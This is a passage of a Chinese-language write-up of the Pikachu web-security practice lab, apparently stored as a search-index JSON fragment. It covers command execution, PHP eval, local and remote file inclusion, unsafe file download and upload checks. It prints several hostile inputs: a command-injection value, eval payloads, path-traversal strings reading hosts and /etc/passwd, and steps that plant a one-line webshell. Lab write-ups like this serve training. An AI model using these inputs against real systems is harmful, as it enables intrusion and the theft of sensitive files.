\u4e00\u822c\u4f1a\u7ed9\u7528\u6237\u63d0\u4f9b\u4e00\u4e2aping\u64cd\u4f5c\u7684web\u754c\u9762\uff0c\u7528\u6237\u4eceweb\u754c\u9762\u8f93\u5165\u76ee\u6807IP\uff0c\u63d0\u4ea4\u540e\uff0c\u540e\u53f0\u4f1a\u5bf9\u8be5IP\u5730\u5740\u8fdb\u884c\u4e00\u6b21ping\u6d4b\u8bd5\uff0c\u5e76\u8fd4\u56de\u6d4b\u8bd5\u7ed3\u679c\u3002 \u800c\uff0c\u5982\u679c\uff0c\u8bbe\u8ba1\u8005\u5728\u5b8c\u6210\u8be5\u529f\u80fd\u65f6\uff0c\u6ca1\u6709\u505a\u4e25\u683c\u7684\u5b89\u5168\u63a7\u5236\uff0c\u5219\u53ef\u80fd\u4f1a\u5bfc\u81f4\u653b\u51fb\u8005\u901a\u8fc7\u8be5\u63a5\u53e3\u63d0\u4ea4\u201c\u610f\u60f3\u4e0d\u5230\u201d\u7684\u547d\u4ee4\uff0c\u4ece\u800c\u8ba9\u540e\u53f0\u8fdb\u884c\u6267\u884c\uff0c\u4ece\u800c\u63a7\u5236\u6574\u4e2a\u540e\u53f0\u670d\u52a1\u5668</p> <p>\u73b0\u5728\u5f88\u591a\u7684\u7532\u65b9\u4f01\u4e1a\u90fd\u5f00\u59cb\u5b9e\u65bd\u81ea\u52a8\u5316\u8fd0\u7ef4,\u5927\u91cf\u7684\u7cfb\u7edf\u64cd\u4f5c\u4f1a\u901a\u8fc7\"\u81ea\u52a8\u5316\u8fd0\u7ef4\u5e73\u53f0\"\u8fdb\u884c\u64cd\u4f5c\u3002 \u5728\u8fd9\u79cd\u5e73\u53f0\u4e0a\u5f80\u5f80\u4f1a\u51fa\u73b0\u8fdc\u7a0b\u7cfb\u7edf\u547d\u4ee4\u6267\u884c\u7684\u6f0f\u6d1e,\u4e0d\u4fe1\u7684\u8bdd\u73b0\u5728\u5c31\u53ef\u4ee5\u627e\u4f60\u4eec\u8fd0\u7ef4\u90e8\u7684\u7cfb\u7edf\u6d4b\u8bd5\u4e00\u4e0b,\u4f1a\u6709\u610f\u60f3\u4e0d\u5230\u7684\"\u6536\u83b7\"-_-</p> <p>\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c \u540c\u6837\u7684\u9053\u7406,\u56e0\u4e3a\u9700\u6c42\u8bbe\u8ba1,\u540e\u53f0\u6709\u65f6\u5019\u4e5f\u4f1a\u628a\u7528\u6237\u7684\u8f93\u5165\u4f5c\u4e3a\u4ee3\u7801\u7684\u4e00\u90e8\u5206\u8fdb\u884c\u6267\u884c,\u4e5f\u5c31\u9020\u6210\u4e86\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u3002 \u4e0d\u7ba1\u662f\u4f7f\u7528\u4e86\u4ee3\u7801\u6267\u884c\u7684\u51fd\u6570,\u8fd8\u662f\u4f7f\u7528\u4e86\u4e0d\u5b89\u5168\u7684\u53cd\u5e8f\u5217\u5316\u7b49\u7b49\u3002 \u56e0\u6b64\uff0c\u5982\u679c\u9700\u8981\u7ed9\u524d\u7aef\u7528\u6237\u63d0\u4f9b\u64cd\u4f5c\u7c7b\u7684API\u63a5\u53e3\uff0c\u4e00\u5b9a\u9700\u8981\u5bf9\u63a5\u53e3\u8f93\u5165\u7684\u5185\u5bb9\u8fdb\u884c\u4e25\u683c\u7684\u5224\u65ad\uff0c\u6bd4\u5982\u5b9e\u65bd\u4e25\u683c\u7684\u767d\u540d\u5355\u7b56\u7565\u4f1a\u662f\u4e00\u4e2a\u6bd4\u8f83\u597d\u7684\u65b9\u6cd5\u3002 \u4f60\u53ef\u4ee5\u901a\u8fc7\u201cRCE\u201d\u5bf9\u5e94\u7684\u6d4b\u8bd5\u680f\u76ee\uff0c\u6765\u8fdb\u4e00\u6b65\u7684\u4e86\u89e3\u8be5\u6f0f\u6d1e\u3002</p>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#5x01-exec-ping","title":"5x01 exec \"ping\"","text":"<ol> <li> <p>\u6253\u5f00\u754c\u9762\uff0c\u6211\u4eec\u5148\u5c1d\u8bd5\u53bbping\u4e00\u4e0b127.0.0.1\uff0c\u8fd9\u4e2a\u662f\u6211\u73b0\u5728\u7684\u672c\u5730\u5730\u5740</p> </li> <li> <p>\u7ed3\u679c\u4e3a\u4e00\u6bb5\u4e71\u7801\uff0c\u4e0d\u8fc7\u4e71\u7801\u662f\u56e0\u4e3a\u7f16\u7801\u65b9\u5f0f\u6709\u95ee\u9898\uff0c\u53ea\u8981ping\u51fa\u4e1c\u897f\u5c31ok \u6211\u4eec\u8fdb\u4e00\u6b65\u5c1d\u8bd5\uff0c\u8f93\u5165127.0.0.1 &amp; ipconfig</p> </li> <li>\u53ef\u4ee5\u53d1\u73b0\uff0c\u8fd9\u91cc\u9664\u4e86\u53ef\u4ee5\u63d0\u4ea4\u76ee\u6807IP\u5730\u5740\u5916\uff0c\u8fd8\u53ef\u4ee5\u901a\u8fc7\u4e00\u4e9b\u62fc\u63a5\u7684\u7b26\u53f7\u6267\u884c\u5176\u4ed6\u7684\u547d\u4ee4\u3002</li> </ol>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#5x02-exec-eval","title":"5x02 exec \"eval\"","text":"<ol> <li>\u968f\u610f\u8f93\u5165\u5b57\u7b26\uff0c\u8fd4\u56de\u6587\u5b57\uff08eval\u51fd\u6570\u53ef\u4ee5\u628a\u5b57\u7b26\u4e32\u5f53\u6210 PHP \u4ee3\u7801\u6765\u6267\u884c\uff09</li> </ol> <p>\u56e0\u6b64\u6211\u4eec\u8f93\u5165phpinfo(); \u53d1\u73b0\u8fd4\u56de\u6765\u4ee5\u4e0b\u9875\u9762\uff1a</p> <p>\u8fd9\u91cc\u5b66\u4e60\u4e00\u4e2aphp\u51fd\u6570 system(\"\")\u6267\u884c\u5916\u90e8\u7a0b\u5e8f\uff0c\u5e76\u4e14\u663e\u793a\u8f93\u51fa\u3002 \u5982system(\u201cipconfig\u201d)</p>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#6-file-inclusion","title":"6 File Inclusion","text":"<p>File Inclusion(\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e)\u6982\u8ff0 \u6587\u4ef6\u5305\u542b\uff0c\u662f\u4e00\u4e2a\u529f\u80fd\u3002\u5728\u5404\u79cd\u5f00\u53d1\u8bed\u8a00\u4e2d\u90fd\u63d0\u4f9b\u4e86\u5185\u7f6e\u7684\u6587\u4ef6\u5305\u542b\u51fd\u6570\uff0c\u5176\u53ef\u4ee5\u4f7f\u5f00\u53d1\u4eba\u5458\u5728\u4e00\u4e2a\u4ee3\u7801\u6587\u4ef6\u4e2d\u76f4\u63a5\u5305\u542b\uff08\u5f15\u5165\uff09\u53e6\u5916\u4e00\u4e2a\u4ee3\u7801\u6587\u4ef6\u3002 \u6bd4\u5982 \u5728PHP\u4e2d\uff0c\u63d0\u4f9b\u4e86\uff1a include(),include_once() require(),require_once() \u8fd9\u4e9b\u6587\u4ef6\u5305\u542b\u51fd\u6570\uff0c\u8fd9\u4e9b\u51fd\u6570\u5728\u4ee3\u7801\u8bbe\u8ba1\u4e2d\u88ab\u7ecf\u5e38\u4f7f\u7528\u5230\u3002 \u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u6587\u4ef6\u5305\u542b\u51fd\u6570\u4e2d\u5305\u542b\u7684\u4ee3\u7801\u6587\u4ef6\u662f\u56fa\u5b9a\u7684\uff0c\u56e0\u6b64\u4e5f\u4e0d\u4f1a\u51fa\u73b0\u5b89\u5168\u95ee\u9898\u3002 \u4f46\u662f\uff0c\u6709\u4e9b\u65f6\u5019\uff0c\u6587\u4ef6\u5305\u542b\u7684\u4ee3\u7801\u6587\u4ef6\u88ab\u5199\u6210\u4e86\u4e00\u4e2a\u53d8\u91cf\uff0c\u4e14\u8fd9\u4e2a\u53d8\u91cf\u53ef\u4ee5\u7531\u524d\u7aef\u7528\u6237\u4f20\u8fdb\u6765\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5982\u679c\u6ca1\u6709\u505a\u8db3\u591f\u7684\u5b89\u5168\u8003\u8651\uff0c\u5219\u53ef\u80fd\u4f1a\u5f15\u53d1\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u3002 \u653b\u51fb\u7740\u4f1a\u6307\u5b9a\u4e00\u4e2a\u201c\u610f\u60f3\u4e0d\u5230\u201d\u7684\u6587\u4ef6\u8ba9\u5305\u542b\u51fd\u6570\u53bb\u6267\u884c\uff0c\u4ece\u800c\u9020\u6210\u6076\u610f\u64cd\u4f5c\u3002 \u6839\u636e\u4e0d\u540c\u7684\u914d\u7f6e\u73af\u5883\uff0c\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u5206\u4e3a\u5982\u4e0b\u4e24\u79cd\u60c5\u51b5\uff1a 1.\u672c\u5730\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\uff1a\u4ec5\u80fd\u591f\u5bf9\u670d\u52a1\u5668\u672c\u5730\u7684\u6587\u4ef6\u8fdb\u884c\u5305\u542b\uff0c\u7531\u4e8e\u670d\u52a1\u5668\u4e0a\u7684\u6587\u4ef6\u5e76\u4e0d\u662f\u653b\u51fb\u8005\u6240\u80fd\u591f\u63a7\u5236\u7684\uff0c\u56e0\u6b64\u8be5\u60c5\u51b5\u4e0b\uff0c\u653b\u51fb\u8005\u66f4\u591a\u7684\u4f1a\u5305\u542b\u4e00\u4e9b\u56fa\u5b9a\u7684\u7cfb\u7edf\u914d\u7f6e\u6587\u4ef6\uff0c\u4ece\u800c\u8bfb\u53d6\u7cfb\u7edf\u654f\u611f\u4fe1\u606f\u3002\u5f88\u591a\u65f6\u5019\u672c\u5730\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u4f1a\u7ed3\u5408\u4e00\u4e9b\u7279\u6b8a\u7684\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff0c\u4ece\u800c\u5f62\u6210\u66f4\u5927\u7684\u5a01\u529b\u3002 2.\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\uff1a\u80fd\u591f\u901a\u8fc7url\u5730\u5740\u5bf9\u8fdc\u7a0b\u7684\u6587\u4ef6\u8fdb\u884c\u5305\u542b\uff0c\u8fd9\u610f\u5473\u7740\u653b\u51fb\u8005\u53ef\u4ee5\u4f20\u5165\u4efb\u610f\u7684\u4ee3\u7801\uff0c\u8fd9\u79cd\u60c5\u51b5\u6ca1\u5565\u597d\u8bf4\u7684\uff0c\u51c6\u5907\u6302\u5f69\u3002 \u56e0\u6b64\uff0c\u5728web\u5e94\u7528\u7cfb\u7edf\u7684\u529f\u80fd\u8bbe\u8ba1\u4e0a\u5c3d\u91cf\u4e0d\u8981\u8ba9\u524d\u7aef\u7528\u6237\u76f4\u63a5\u4f20\u53d8\u91cf\u7ed9\u5305\u542b\u51fd\u6570\uff0c\u5982\u679c\u975e\u8981\u8fd9\u4e48\u505a\uff0c\u4e5f\u4e00\u5b9a\u8981\u505a\u4e25\u683c\u7684\u767d\u540d\u5355\u7b56\u7565\u8fdb\u884c\u8fc7\u6ee4\u3002 \u4f60\u53ef\u4ee5\u901a\u8fc7\u201cFile Inclusion\u201d\u5bf9\u5e94\u7684\u6d4b\u8bd5\u680f\u76ee\uff0c\u6765\u8fdb\u4e00\u6b65\u7684\u4e86\u89e3\u8be5\u6f0f\u6d1e\u3002 </p> <p>\u901a\u8fc7Include\uff08\uff09\u6216require\uff08\uff09\u8bed\u53e5\uff0c\u53ef\u4ee5\u5c06PHP\u6587\u4ef6\u7684\u5185\u5bb9\u63d2\u5165\u5230\u53e6\u4e00\u4e2aPHP\u6587\u4ef6\uff08\u5728\u670d\u52a1\u5668\u6267\u884c\u5b83\u4e4b\u524d\uff09\u3002 include\u548crequire\u8bed\u53e5\u662f\u76f8\u540c\u7684\uff0c\u9664\u4e86\u9519\u8bef\u5904\u7406\u65b9\u9762\uff1a require\u4f1a\u751f\u6210\u81f4\u547d\u9519\u8bef\uff08E_COMPILE ERROR\uff09\u5e76\u505c\u6b62\u811a\u672c\u6267\u884c include\u53ea\u751f\u6210\u8b66\u544a\uff08E WARNING\uff09\uff0c\u5e76\u4e14\u811a\u672c\u4f1a\u7ee7\u7eed\u6267\u884c</p>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#6x01-file-inclusionlocal","title":"6x01 File Inclusion\uff08Local\uff09","text":"<ol> <li>\u6211\u4eec\u5148\u968f\u4fbf\u9009\u62e9\u4e00\u4e2a\u9009\u9879\uff0c\u8fd9\u91cc\u4ee5kobe\u4e3a\u4f8b</li> <li>\u89c2\u5bdfurl\u53d1\u73b0\uff0curl\u4e2d\u5305\u542b\u6709file1.php \u8fd9\u4e9b\u6587\u4ef6\u4e00\u822c\u90fd\u662f\u540e\u53f0\u5b58\u7684\u6587\u4ef6\uff0c\u6211\u4eec\u5728\u524d\u7aef\u53d1\u9001\u4e00\u4e2a\u8bf7\u6c42\uff0c\u7136\u540e\u540e\u53f0\u8fd4\u56de\u6765\u8fd9\u4e2a\u6587\u4ef6\uff0c\u90a3\u4e48\u6211\u4eec\u5f53\u7136\u53ef\u4ee5\u53bb\u4fee\u6539\u8fd9\u4e2a\u6587\u4ef6\u7684\u8def\u5f84\uff0c\u6bd4\u5982\u5c06\u5176\u6539\u6210\u4e00\u4e9b\u56fa\u5b9a\u7684\u914d\u7f6e\u6587\u4ef6\u4f8b\u5982../../../../Windows/System32/drivers/etc/hosts\u3002 \u53ef\u4ee5\u53d1\u73b0\uff0c\u914d\u7f6e\u6587\u4ef6\u5c31\u66b4\u9732\u5728\u6211\u4eec\u9762\u524d\u4e86\u3002</li> </ol>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#6x02-file-inclusionremote","title":"6x02 File Inclusion\uff08remote\uff09","text":"<p>\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u5f62\u5f0f\u548c\u672c\u5730\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u5dee\u4e0d\u591a\uff0c\u5728\u8fdc\u7a0b\u5305\u542b\u6f0f\u6d1e\u4e2d\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u8bbf\u95ee\u5916\u90e8\u5730\u5740\u6765\u52a0\u8f7d\u8fdc\u7a0b\u4ee3\u7801\u3002 \u8fdc\u7a0b\u5305\u542b\u6f0f\u6d1e\u524d\u63d0\uff0c\u5982\u679c\u4f7f\u7528\u7684\u662finclude\u548crequire\u51fd\u6570\uff0c\u5219\u9700\u8981php.ini\u914d\u7f6e\u5982\u4e0b\uff08php5.4.34\uff09\uff1a allow_url_fopen=on //\u9ed8\u8ba4\u6253\u5f00 allow_url_include=on //\u9ed8\u8ba4\u5173\u95ed \u5199\u5165\u4e00\u53e5\u8bdd\u6728\u9a6c\uff0c\u5371\u5bb3\u6781\u5927</p> <p>\u82e5\u662fphpstudy\uff0c\u5219\u5305\u542b\u65b9\u5f0f\u5982\u4e0b\u56fe\u6240\u793a 1. \u6211\u4eec\u4f9d\u65e7\u662f\u968f\u4fbf\u9009\u62e9\u4e00\u4e2a\u9009\u9879\uff0c\u63d0\u4ea4\u67e5\u770burl 2. \u5176\u4e2durl\u63d0\u4ea4\u7684\u662f\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u7684\u8def\u5f84\uff0c\u6211\u4eec\u53ef\u4ee5\u6539\u6210\u4e00\u4e2a\u8fdc\u7aef\u7684\u8def\u5f84\uff0c\u8bfb\u53d6\u8fdc\u7a0b\u6587\u4ef6\u3002 \u6211\u4eec\u5728\u6d4f\u89c8\u5668\u5730\u5740\u680f\u4e2d\u8f93\u5165\u4e00\u4e0b\u5730\u5740\uff08\u5176\u4e2d\u7684127.0.0.1\u7b49\u6839\u636e\u4e2a\u4eba\u60c5\u51b5\u81ea\u884c\u8865\u5168\uff09<code>/pikachu/test/yijuhua.txt</code> \u8fd0\u884c\u540e\u6210\u529f\u5728\u540e\u53f0\u751f\u6210\u4e86yijuhua.php</p>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#7-unsafe-filedownload","title":"7 Unsafe filedownload","text":"<p>\u4e0d\u5b89\u5168\u7684\u6587\u4ef6\u4e0b\u8f7d\u6982\u8ff0 \u6587\u4ef6\u4e0b\u8f7d\u529f\u80fd\u5728\u5f88\u591aweb\u7cfb\u7edf\u4e0a\u90fd\u4f1a\u51fa\u73b0\uff0c\u4e00\u822c\u6211\u4eec\u5f53\u70b9\u51fb\u4e0b\u8f7d\u94fe\u63a5\uff0c\u4fbf\u4f1a\u5411\u540e\u53f0\u53d1\u9001\u4e00\u4e2a\u4e0b\u8f7d\u8bf7\u6c42\uff0c\u4e00\u822c\u8fd9\u4e2a\u8bf7\u6c42\u4f1a\u5305\u542b\u4e00\u4e2a\u9700\u8981\u4e0b\u8f7d\u7684\u6587\u4ef6\u540d\u79f0\uff0c\u540e\u53f0\u5728\u6536\u5230\u8bf7\u6c42\u540e\u4f1a\u5f00\u59cb\u6267\u884c\u4e0b\u8f7d\u4ee3\u7801\uff0c\u5c06\u8be5\u6587\u4ef6\u540d\u5bf9\u5e94\u7684\u6587\u4ef6response\u7ed9\u6d4f\u89c8\u5668\uff0c\u4ece\u800c\u5b8c\u6210\u4e0b\u8f7d\u3002\u5982\u679c\u540e\u53f0\u5728\u6536\u5230\u8bf7\u6c42\u7684\u6587\u4ef6\u540d\u540e,\u5c06\u5176\u76f4\u63a5\u62fc\u8fdb\u4e0b\u8f7d\u6587\u4ef6\u7684\u8def\u5f84\u4e2d\u800c\u4e0d\u5bf9\u5176\u8fdb\u884c\u5b89\u5168\u5224\u65ad\u7684\u8bdd\uff0c\u5219\u53ef\u80fd\u4f1a\u5f15\u53d1\u4e0d\u5b89\u5168\u7684\u6587\u4ef6\u4e0b\u8f7d\u6f0f\u6d1e\u3002 \u6b64\u65f6\u5982\u679c\u653b\u51fb\u8005\u63d0\u4ea4\u7684\u4e0d\u662f\u4e00\u4e2a\u7a0b\u5e8f\u9884\u671f\u7684\u7684\u6587\u4ef6\u540d\uff0c\u800c\u662f\u4e00\u4e2a\u7cbe\u5fc3\u6784\u9020\u7684\u8def\u5f84(\u6bd4\u5982../../../etc/passwd),\u5219\u5f88\u6709\u53ef\u80fd\u4f1a\u76f4\u63a5\u5c06\u8be5\u6307\u5b9a\u7684\u6587\u4ef6\u4e0b\u8f7d\u4e0b\u6765\u3002\u4ece\u800c\u5bfc\u81f4\u540e\u53f0\u654f\u611f\u4fe1\u606f(\u5bc6\u7801\u6587\u4ef6\u3001\u6e90\u4ee3\u7801\u7b49)\u88ab\u4e0b\u8f7d\u3002 \u6240\u4ee5\uff0c\u5728\u8bbe\u8ba1\u6587\u4ef6\u4e0b\u8f7d\u529f\u80fd\u65f6\uff0c\u5982\u679c\u4e0b\u8f7d\u7684\u76ee\u6807\u6587\u4ef6\u662f\u7531\u524d\u7aef\u4f20\u8fdb\u6765\u7684\uff0c\u5219\u4e00\u5b9a\u8981\u5bf9\u4f20\u8fdb\u6765\u7684\u6587\u4ef6\u8fdb\u884c\u5b89\u5168\u8003\u8651\u3002 \u5207\u8bb0\uff1a\u6240\u6709\u4e0e\u524d\u7aef\u4ea4\u4e92\u7684\u6570\u636e\u90fd\u662f\u4e0d\u5b89\u5168\u7684\uff0c\u4e0d\u80fd\u6389\u4ee5\u8f7b\u5fc3\uff01 \u4f60\u53ef\u4ee5\u901a\u8fc7\u201cUnsafe file download\u201d\u5bf9\u5e94\u7684\u6d4b\u8bd5\u680f\u76ee\uff0c\u6765\u8fdb\u4e00\u6b65\u7684\u4e86\u89e3\u8be5\u6f0f\u6d1e\u3002</p>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#7x01-unsafe-filedownload","title":"7x01  unsafe filedownload","text":"<ol> <li>\u6211\u4eec\u5728\u6b64\u9875\u9762\uff0c\u70b9\u51fb\u7403\u5458\u540d\u5b57\uff0c\u5c31\u53ef\u4ee5\u4e0b\u8f7d\u5176\u5bf9\u5e94\u7684\u56fe\u7247\uff0c\u5982\u8fd9\u91cc\u6211\u4eec\u70b9\u51fbkobe\u7684\u540d\u5b57\uff0c\u89c2\u5bdf\u4e0b\u8f7d\u94fe\u63a5\uff1a</li> </ol> <p>PHP<pre><code>http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=kb.png\n</code></pre> \u5728\u5176\u6700\u540e\u6709kb.png\u5b57\u6837\uff0c\u8fd9\u8bf4\u660e\u6211\u4eec\u70b9\u51fb\u6b64\u56fe\u7247\u540e\uff0c\u524d\u7aef\u5411\u540e\u7aef\u53d1\u9001\u4e86\u4e0b\u8f7dkb.png\u7684\u8bf7\u6c42\uff0c\u7136\u540e\u540e\u7aef\u63d0\u4f9b\u7ed9\u524d\u7aef\u7167\u7247 2. \u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u8bb2\u6b64\u65f6\u7684\u94fe\u63a5\u7684\u201ckb.png\u201d\u6539\u4e3a\u201cmbl.png\u201d\uff0c\u53d1\u73b0\u4e0b\u8f7d\u540e\u7684\u7167\u7247\u662f\u5176\u5bf9\u5e94\u7684\u201c\u65af\u8482\u82ac \u9a6c\u5e03\u91cc\u201d\u800c\u975e\u201c\u79d1\u6bd4\u201d\u3002</p> <p>\u67e5\u770b\u5176\u5b83\u8d44\u6599\u5f97\u77e5\uff1a\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539filename\u7684\u503c\u53bb\u4e0b\u8f7d\u5176\u4ed6\u56fe\u7247\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u4f7f\u7528\u76ee\u5f55\u904d\u5386\u7684\u65b9\u5f0f\u53bb\u4fee\u6539\u94fe\u63a5\u4e0b\u8f7d\u654f\u611f\u6587\u4ef6\u3002 \u9632\u8303\u63aa\u65bd\uff1a 1.\u5bf9\u4f20\u5165\u7684\u6587\u4ef6\u540d\u8fdb\u884c\u4e25\u683c\u7684\u8fc7\u6ee4\u548c\u9650\u5b9a 2.\u5bf9\u6587\u4ef6\u4e0b\u8f7d\u7684\u76ee\u5f55\u8fdb\u884c\u4e25\u683c\u7684\u9650\u5b9a</p>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#8-unsafe-fileupload","title":"8 Unsafe fileupload","text":"<p>\u4e0d\u5b89\u5168\u7684\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u6982\u8ff0 \u6587\u4ef6\u4e0a\u4f20\u529f\u80fd\u5728web\u5e94\u7528\u7cfb\u7edf\u5f88\u5e38\u89c1\uff0c\u6bd4\u5982\u5f88\u591a\u7f51\u7ad9\u6ce8\u518c\u7684\u65f6\u5019\u9700\u8981\u4e0a\u4f20\u5934\u50cf\u3001\u4e0a\u4f20\u9644\u4ef6\u7b49\u7b49\u3002\u5f53\u7528\u6237\u70b9\u51fb\u4e0a\u4f20\u6309\u94ae\u540e\uff0c\u540e\u53f0\u4f1a\u5bf9\u4e0a\u4f20\u7684\u6587\u4ef6\u8fdb\u884c\u5224\u65ad \u6bd4\u5982\u662f\u5426\u662f\u6307\u5b9a\u7684\u7c7b\u578b\u3001\u540e\u7f00\u540d\u3001\u5927\u5c0f\u7b49\u7b49\uff0c\u7136\u540e\u5c06\u5176\u6309\u7167\u8bbe\u8ba1\u7684\u683c\u5f0f\u8fdb\u884c\u91cd\u547d\u540d\u540e\u5b58\u50a8\u5728\u6307\u5b9a\u7684\u76ee\u5f55\u3002 \u5982\u679c\u8bf4\u540e\u53f0\u5bf9\u4e0a\u4f20\u7684\u6587\u4ef6\u6ca1\u6709\u8fdb\u884c\u4efb\u4f55\u7684\u5b89\u5168\u5224\u65ad\u6216\u8005\u5224\u65ad\u6761\u4ef6\u4e0d\u591f\u4e25\u8c28\uff0c\u5219\u653b\u51fb\u7740\u53ef\u80fd\u4f1a\u4e0a\u4f20\u4e00\u4e9b\u6076\u610f\u7684\u6587\u4ef6\uff0c\u6bd4\u5982\u4e00\u53e5\u8bdd\u6728\u9a6c\uff0c\u4ece\u800c\u5bfc\u81f4\u540e\u53f0\u670d\u52a1\u5668\u88abwebshell\u3002 \u6240\u4ee5\uff0c\u5728\u8bbe\u8ba1\u6587\u4ef6\u4e0a\u4f20\u529f\u80fd\u65f6\uff0c\u4e00\u5b9a\u8981\u5bf9\u4f20\u8fdb\u6765\u7684\u6587\u4ef6\u8fdb\u884c\u4e25\u683c\u7684\u5b89\u5168\u8003\u8651\u3002\u6bd4\u5982\uff1a</p> <ul> <li>\u9a8c\u8bc1\u6587\u4ef6\u7c7b\u578b\u3001\u540e\u7f00\u540d\u3001\u5927\u5c0f;</li> <li>\u9a8c\u8bc1\u6587\u4ef6\u7684\u4e0a\u4f20\u65b9\u5f0f;</li> <li>\u5bf9\u6587\u4ef6\u8fdb\u884c\u4e00\u5b9a\u590d\u6742\u7684\u91cd\u547d\u540d;</li> <li>\u4e0d\u8981\u66b4\u9732\u6587\u4ef6\u4e0a\u4f20\u540e\u7684\u8def\u5f84;</li> <li>\u7b49\u7b49...</li> </ul> <p>\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u6d4b\u8bd5\u6d41\u7a0b\uff1a 1\uff0c\u5bf9\u6587\u4ef6\u4e0a\u4f20\u7684\u5730\u65b9\u6309\u7167\u8981\u6c42\u4e0a\u4f20\u6587\u4ef6\uff0c\u67e5\u770b\u8fd4\u56de\u7ed3\u679c(\u8def\u5f84\uff0c\u63d0\u793a\u7b49); 2 \uff0c\u5c1d\u8bd5\u4e0a\u4f20\u4e0d\u540c\u7c7b\u578b\u7684\u201c\u6076\u610f\"\u6587\u4ef6\uff0c\u6bd4\u5982xx.php\u6587\u4ef6,\u5206\u6790\u7ed3\u679c; 3\uff0c\u67e5\u770bhtml\u6e90\u7801\uff0c\u770b\u662f\u5426\u901a\u8fc7js\u5728\u524d\u7aef\u505a\u4e86\u4e0a\u4f20\u9650\u5236\uff0c\u53ef\u4ee5\u7ed5\u8fc7; 4 \uff0c\u5c1d\u8bd5\u4f7f\u7528\u4e0d\u540c\u65b9\u5f0f\u8fdb\u884c\u7ed5\u8fc7:\u9ed1\u767d\u540d\u5355\u7ed5\u8fc7/MIME\u7c7b\u578b\u7ed5\u8fc7/\u76ee\u5f550x00\u622a\u65ad\u7ed5\u8fc7\u7b49; 5\uff0c\u731c\u6d4b\u6216\u8005\u7ed3\u5408\u5176\u4ed6\u6f0f\u6d1e(\u6bd4\u5982\u654f\u611f\u4fe1\u606f\u6cc4\u9732\u7b49)\u5f97\u5230\u6728\u9a6c\u8def\u5f84,\u8fde\u63a5\u6d4b\u8bd5\u3002</p> <p>### 8x01 client check</p> <ol> <li>\u6211\u4eec\u5148\u5c1d\u8bd5\u968f\u4fbf\u4e0a\u4f20\u4e00\u4e2a\u975e\u56fe\u7247\u683c\u5f0f\u7684\u6587\u4ef6\uff0c\u53d1\u73b0\u4e0a\u4f20\u5931\u8d25\u201c\u4e0a\u4f20\u7684\u6587\u4ef6\u4e0d\u7b26\u5408\u8981\u6c42\uff0c\u8bf7\u91cd\u65b0\u9009\u62e9\uff01\u201d</li> <li>\u4e0a\u4f20\u5176\u4ed6\u7c7b\u578b\u7684\u6587\u4ef6\u4e0d\u88ab\u5141\u8bb8\uff0c\u8fd9\u5f88\u53ef\u80fd\u662f\u5728\u524d\u7aef\u505a\u4e86\u9650\u5236\uff0c\u6240\u4ee5\u6211\u4eecF12\u770b\u4e00\u4e0b</li> </ol> <p>PHP<pre><code>&lt;input class=\"uploadfile\" type=\"file\" name=\"uploadfile\" onchange=\"checkFileExt(this.value)\"&gt;\n</code></pre> 3. \u6211\u4eec\u518d\u770b\u4e00\u4e0b\u6e90\u4ee3\u7801clientcheck.php\uff0c\u53d1\u73b0\u5176\u53ea\u5141\u8bb8jpg\u3001png\u3001gif\u4e09\u79cd\u683c\u5f0f\u3002</p> <p>PHP<pre><code>&lt;script&gt;\n    function checkFileExt(filename)\n    {\n        var flag = false; //\u72b6\u6001\n        var arr = [\"jpg\",\"png\",\"gif\"];\n        //\u53d6\u51fa\u4e0a\u4f20\u6587\u4ef6\u7684\u6269\u5c55\u540d\n        var index = filename.lastIndexOf(\".\");\n        var ext = filename.substr(index+1);\n        //\u6bd4\u8f83\n        for(var i=0;i&lt;arr.length;i++)\n        {\n            if(ext == arr[i])\n            {\n                flag = true; //\u4e00\u65e6\u627e\u5230\u5408\u9002\u7684\uff0c\u7acb\u5373\u9000\u51fa\u5faa\u73af\n                break;\n            }\n        }\n        //\u6761\u4ef6\u5224\u65ad\n        if(!flag)\n        {\n            alert(\"\u4e0a\u4f20\u7684\u6587\u4ef6\u4e0d\u7b26\u5408\u8981\u6c42\uff0c\u8bf7\u91cd\u65b0\u9009\u62e9\uff01\");\n            location.reload(true);\n        }\n    }\n&lt;/script&gt;\n</code></pre> 4. 